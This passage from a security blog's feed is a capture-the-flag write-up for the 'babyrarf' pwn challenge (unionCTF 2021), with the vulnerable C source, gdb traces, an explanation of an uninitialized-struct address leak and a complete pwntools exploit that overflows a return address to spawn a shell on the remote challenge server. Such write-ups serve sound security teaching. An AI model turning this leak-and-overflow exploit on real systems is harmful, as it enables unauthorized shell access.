    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">health</span><span class="p">;</span>
<span class="p">}</span> <span class="n">character</span><span class="p">;</span>

<span class="kt">uint8_t</span> <span class="n">score</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">read_int</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">get_shell</span><span class="p">(){</span>
    <span class="n">execve</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">attack</span> <span class="nf">choose_attack</span><span class="p">(){</span>
    <span class="n">attack</span> <span class="n">a</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Choose an attack:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;1. Knife</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;2. A bigger knife</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;3. Her Majesty&#39;s knife</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;4. A cr0wn</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">id</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">id</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
        <span class="n">a</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="n">a</span><span class="p">.</span><span class="n">dmg</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">id</span> <span class="o">==</span> <span class="mi">2</span><span class="p">){</span>
        <span class="n">a</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
        <span class="n">a</span><span class="p">.</span><span class="n">dmg</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">id</span> <span class="o">==</span> <span class="mi">3</span><span class="p">){</span>
        <span class="n">a</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
        <span class="n">a</span><span class="p">.</span><span class="n">dmg</span> <span class="o">=</span> <span class="mi">30</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">id</span> <span class="o">==</span> <span class="mi">4</span><span class="p">){</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">score</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
            <span class="n">puts</span><span class="p">(</span><span class="s">&#34;l0zers don&#39;t get cr0wns</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span><span class="p">{</span>
            <span class="n">a</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
            <span class="n">a</span><span class="p">.</span><span class="n">dmg</span> <span class="o">=</span> <span class="mi">40</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Please select a valid attack next time</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="n">a</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">a</span><span class="p">.</span><span class="n">dmg</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">a</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">character</span> <span class="n">player</span> <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">health</span> <span class="o">=</span> <span class="mi">100</span><span class="p">};</span>
    <span class="n">character</span> <span class="n">boss</span> <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">health</span> <span class="o">=</span> <span class="mi">100</span><span class="p">,</span> <span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="s">&#34;boss&#34;</span><span class="p">};</span>
    <span class="n">attack</span> <span class="n">a</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">dmg</span><span class="p">;</span>

    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">srand</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You are fighting the rarf boss!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;What is your name?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">fgets</span><span class="p">(</span><span class="n">player</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>

    <span class="n">score</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="n">score</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">){</span>
        <span class="n">a</span> <span class="o">=</span> <span class="n">choose_attack</span><span class="p">();</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;You choose attack %llu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">a</span><span class="p">.</span><span class="n">id</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;You deal %llu dmg</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">a</span><span class="p">.</span><span class="n">dmg</span><span class="p">);</span>
        <span class="n">boss</span><span class="p">.</span><span class="n">health</span> <span class="o">-=</span> <span class="n">a</span><span class="p">.</span><span class="n">dmg</span><span class="p">;</span>
        <span class="n">dmg</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">100</span><span class="p">;</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;The boss deals %llu dmg</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">dmg</span><span class="p">);</span>
        <span class="n">player</span><span class="p">.</span><span class="n">health</span> <span class="o">-=</span> <span class="n">dmg</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">player</span><span class="p">.</span><span class="n">health</span> <span class="o">&gt;</span> <span class="n">boss</span><span class="p">.</span><span class="n">health</span><span class="p">){</span>
            <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You won!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
            <span class="n">score</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span><span class="p">{</span>
            <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You lost!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
            <span class="n">score</span> <span class="o">-=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">player</span><span class="p">.</span><span class="n">health</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
        <span class="n">boss</span><span class="p">.</span><span class="n">health</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Congratulations! You may now declare yourself the winner:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">fgets</span><span class="p">(</span><span class="n">player</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div><p>It&rsquo;s basically some kind of game, we have to win a lot of times to display <code>Congratulations! You may now declare yourself the winner</code>. And when we reach this part we can trigger a buffer overflow with a call to fgets (<code>fgets(player.name, 48, stdin);</code>). We notice too the get_shell function (maybe we will have to jump on ?).</p>
<p>Let&rsquo;s take a look at gdb:</p>
<pre tabindex="0"><code>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf48│+0x0000: 0x00007ffff7dd30b3  →  &lt;__libc_start_main+243&gt; mov edi, eax	 ← $rsp
0x00007fffffffdf50│+0x0008: 0x00007ffff7ffc620  →  0x0005081200000000
0x00007fffffffdf58│+0x0010: 0x00007fffffffe038  →  0x00007fffffffe357  →  &quot;/home/nasm/dist/babyrarf&quot;
0x00007fffffffdf60│+0x0018: 0x0000000100000000
0x00007fffffffdf68│+0x0020: 0x00005555555552e4  →  &lt;main+0&gt; push rbp
0x00007fffffffdf70│+0x0028: 0x00005555555554d0  →  &lt;__libc_csu_init+0&gt; endbr64 
0x00007fffffffdf78│+0x0030: 0xdb21ca7fd193f05a
0x00007fffffffdf80│+0x0038: 0x00005555555550b0  →  &lt;_start+0&gt; endbr64 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555552de &lt;choose_attack+234&gt; mov    rdx, QWORD PTR [rbp-0x18]
   0x5555555552e2 &lt;choose_attack+238&gt; leave  
   0x5555555552e3 &lt;choose_attack+239&gt; ret    
 → 0x5555555552e4 &lt;main+0&gt;         push   rbp
   0x5555555552e5 &lt;main+1&gt;         mov    rbp, rsp
   0x5555555552e8 &lt;main+4&gt;         sub    rsp, 0x40
   0x5555555552ec &lt;main+8&gt;         mov    QWORD PTR [rbp-0x20], 0x0
   0x5555555552f4 &lt;main+16&gt;        mov    QWORD PTR [rbp-0x18], 0x0
   0x5555555552fc &lt;main+24&gt;        mov    DWORD PTR [rbp-0x14], 0x64
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: &quot;babyrarf&quot;, stopped 0x5555555552e4 in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555552e4 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
</code></pre><p>And at the call to fgets:</p>
<pre tabindex="0"><code>   0x55555555537d &lt;main+153&gt;       lea    rax, [rbp-0x20]
   0x555555555381 &lt;main+157&gt;       mov    esi, 0xa
   0x555555555386 &lt;main+162&gt;       mov    rdi, rax
 → 0x555555555389 &lt;main+165&gt;       call   0x555555555060 &lt;fgets@plt&gt;
   ↳  0x555555555060 &lt;fgets@plt+0&gt;    jmp    QWORD PTR [rip+0x2fca]        # 0x555555558030 &lt;fgets@got.plt&gt;
      0x555555555066 &lt;fgets@plt+6&gt;    push   0x3
      0x55555555506b &lt;fgets@plt+11&gt;   jmp    0x555555555020
      0x555555555070 &lt;execve@plt+0&gt;   jmp    QWORD PTR [rip+0x2fc2]        # 0x555555558038 &lt;execve@got.plt&gt;
      0x555555555076 &lt;execve@plt+6&gt;   push   0x4
      0x55555555507b &lt;execve@plt+11&gt;  jmp    0x555555555020
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
fgets@plt (
   $rdi = 0x00007fffffffdf20 → 0x0000000000000000,
   $rsi = 0x000000000000000a,
   $rdx = 0x00007ffff7f97980 → 0x00000000fbad208b
)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: &quot;babyrarf&quot;, stopped 0x555555555389 in main (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555389 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
</code></pre><p>So main_ret_addr minus player.name is equal to: <code>0x00007fffffffdf48 - 0x00007fffffffdf20 = 40 </code>.
So we have basically a padding of 40 bytes before the return address, and according to the last fgets, we can only enter 48 bytes.
We can so overwrite only the return address.</p>
<p>Now we can take a look at the permissions:</p>
<pre tabindex="0"><code>gef➤  checksec
[+] checksec for '/home/nasm/dist/babyrarf'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Partial
</code></pre><p>We can see, the binary is PIE based, so in order to jump on get_shell we need to leak some binary&rsquo;s functions.
To do so we can mind the code of <code>choose_attack</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
<span class="n">attack</span> <span class="nf">choose_attack</span><span class="p">(){</span>
    <span class="n">attack</span> <span class="n">a</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
    <span class="cm">/* Some print stuff */</span>
    <span class="n">id</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span> <span class="c1">// It is readinf the type of weapons we want
</span><span class="c1"></span>    
    <span class="cm">/* Here it is handling properly dammage and weapon type */</span>

    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">id</span> <span class="o">==</span> <span class="mi">4</span><span class="p">){</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">score</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
            <span class="n">puts</span><span class="p">(</span><span class="s">&#34;l0zers don&#39;t get cr0wns</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span><span class="p">{</span>
            <span class="n">a</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
            <span class="n">a</span><span class="p">.</span><span class="n">dmg</span> <span class="o">=</span> <span class="mi">40</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Please select a valid attack next time</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="n">a</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">a</span><span class="p">.</span><span class="n">dmg</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">a</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div><p>The interesting part is that when our score is zero and that we choose the fourth weapon, the id et dmg fields are not initialized.
And so it&rsquo;s returning a non initialized struct that it will print just next in the main function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
    <span class="cm">/* ... */</span>
    <span class="n">a</span> <span class="o">=</span> <span class="n">choose_attack</span><span class="p">();</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;You choose attack %llu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">a</span><span class="p">.</span><span class="n">id</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;You deal %llu dmg</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">a</span><span class="p">.</span><span class="n">dmg</span><span class="p">);</span>
    <span class="cm">/*...*/</span>

</code></pre></div><p>Uninitialized structures are very useful to obtain leaks because their content is depending of the ancient stackframes which have stored local variables and especially useful pointers.
And when we try to leak these datas, we can see that a.id displays the address of <code>__lib_csu_init</code>.
So we just need to leak the address of <code>__lib_csu_init</code> to compute the base address of the binary and so the address of <code>get_shell</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python">
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1">#p = process(&#34;babyrarf&#34;)</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;35.204.144.114&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;babyrarf&#39;</span><span class="p">)</span>

<span class="n">set_</span> <span class="o">=</span> <span class="kc">False</span>
<span class="n">base</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">csu_leak</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">def</span> <span class="nf">padd</span><span class="p">(</span><span class="n">d</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">d</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\00</span><span class="s1">&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">d</span><span class="p">))</span>

<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;What is your name?</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">))</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;nasm&#34;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;4. A cr0wn</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">))</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>

<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
    <span class="n">a</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;4. A cr0wn</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">a</span><span class="p">:</span>
        <span class="k">break</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    
    <span class="k">if</span> <span class="ow">not</span> <span class="n">set_</span><span class="p">:</span>
        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>

    <span class="n">b</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;You choose attack &#34;</span><span class="p">)</span>

    <span class="k">if</span> <span class="s2">&#34;l0zers don&#39;t get cr0wns&#34;</span> <span class="ow">in</span> <span class="n">b</span><span class="p">:</span>
        <span class="n">leak_csu</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">padd</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)))</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;leak_csu=</span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">leak_csu</span><span class="p">))))</span>
        <span class="n">base</span> <span class="o">=</span> <span class="n">leak_csu</span> <span class="o">-</span> <span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__libc_csu_init&#39;</span><span class="p">]</span>

        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;base: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">)))</span>

        <span class="n">set_</span> <span class="o">=</span> <span class="kc">True</span>

<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Congratulations! You may now declare yourself the winner:</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">))</span>

<span class="c1">#gdb.attach(p.pid)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">40</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;get_shell&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">base</span><span class="p">))</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></div><p>We can compute compute the value of rand to avoid bruteforce, but I&rsquo;ve choosen to do not. So while it does not print <code>l0zers don't get cr0wns</code>, I&rsquo;m sending 4 for cr0wn and when it is teh case I get my leak of the csu and I compute the base address.
When It&rsquo;s done I&rsquo;m sending 1 because it sounds more speed and I wait to win.
And when I won I can trigger the buffer overflow and jmp on <code>get_shell</code>.</p>
<pre tabindex="0"><code>
/* ... */
/* lot of iterations */
/* ... */

You deal 40 dmg
The boss deals 70 dmg
You lost!

Choose an attack:

1. Knife

2. A bigger knife

3. Her Majesty's knife

4. A cr0wn


leak_csu=0x55b3b5b3a4d0
base: 0x55b3b5b39000
You deal 140736258161760 dmg
The boss deals 96 dmg
You lost!

Congratulations! You may now declare yourself the winner:


[*] Switching to interactive mode
$ cat /home/babyrarf/flag.txt
union{baby_rarf_d0o_d00_do0_doo_do0_d0o}
</code></pre><p>The final script can be found <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/blob/master/2021/unionctf/pwn/babyrarf/p0wn.py"
  
  >here</a
>.</p>
<p>That&rsquo;s all folks :)</p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/unionCTF-2021" term="unionCTF-2021" label="unionCTF 2021" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/buffer-overflow" term="buffer-overflow" label="buffer overflow" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/2021" term="2021" label="2021" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[About]]></title>
            <link href="https://nasm.re/posts/about/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/about/</id>
            
                    <author>
                        <name>nasm</name>
                    </author>
            <published>0001-01-01T00:00:00+00:00</published>
            <updated>0001-01-01T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<p>I&rsquo;m a french security enthusiast focused on low level stuff especially on binary obfuscation / analysis and on kernel stuff.</p>
<ul>
<li>🔭 I’m currently working on DBI engine stuff.</li>
<li>Doing CTF&rsquo;s for <a
  class="gblog-markdown__link"
  href="https://ret2school.github.io"
  
  >ret2school</a
>, + pwn / RE / kernel.</li>
</ul>
<!--
**n4sm/n4sm** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.

Here are some ideas to get you started:

- 🔭 I’m currently working on ...
- 🌱 I’m currently learning ...
- 👯 I’m looking to collaborate on ...
- 🤔 I’m looking for help with ...
- 💬 Ask me about ...
- 📫 How to reach me: ...
- 😄 Pronouns: ...
- ⚡ Fun fact: ...
-->
]]></content>
            
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/authors/nasm" term="nasm" label="nasm" />
                            
                        
                    
                 
                    
                
            
        </entry>
    
</feed>
